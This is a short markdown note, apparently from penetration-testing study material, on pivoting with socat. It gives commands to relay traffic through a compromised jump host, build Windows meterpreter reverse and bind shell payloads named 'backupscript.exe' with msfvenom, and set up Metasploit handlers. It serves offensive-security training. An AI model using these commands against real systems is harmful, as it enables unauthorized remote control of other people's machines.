---
description: >-
  Socat is a bidirectional relay tool that can create pipe sockets between 2
  independent byte streams and transfer data between them.
---

# Socat

**Starting Socat Listener (On Jump host)**

```shell-session
victim@jump-host$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat will listen on localhost port 8080 and forward all traffic to port 80 on our attack host(10.10.14.18). The next step is to configure a payload that will connect back to our redirector on the victim host. We also start a listener on our attack host on port 80.

**Creating the Windows Payload (Delivered to Windows machine)**

```shell-session
attacker@attack-host$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

**Configuring & Starting the multi/handler (on Attack host)**

```shell-session
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```



## Socat Redirection with a Bind Shell

Like we did above for a reverse redirector where we start a socat listener on our jump host, in the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time we create a socat listener on our jump host that listens for incoming connections and forward them to the bind shell on Windows.



**Creating the Windows Payload (Delivered to Windows host)**

```shell-session
attacker@attack-host$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

**Starting Socat Bind Shell Listener (on Jump host)**

```shell-session
victim@jump-host$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

\
**Configuring & Starting the Bind multi/handler (on Attack host)**

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```
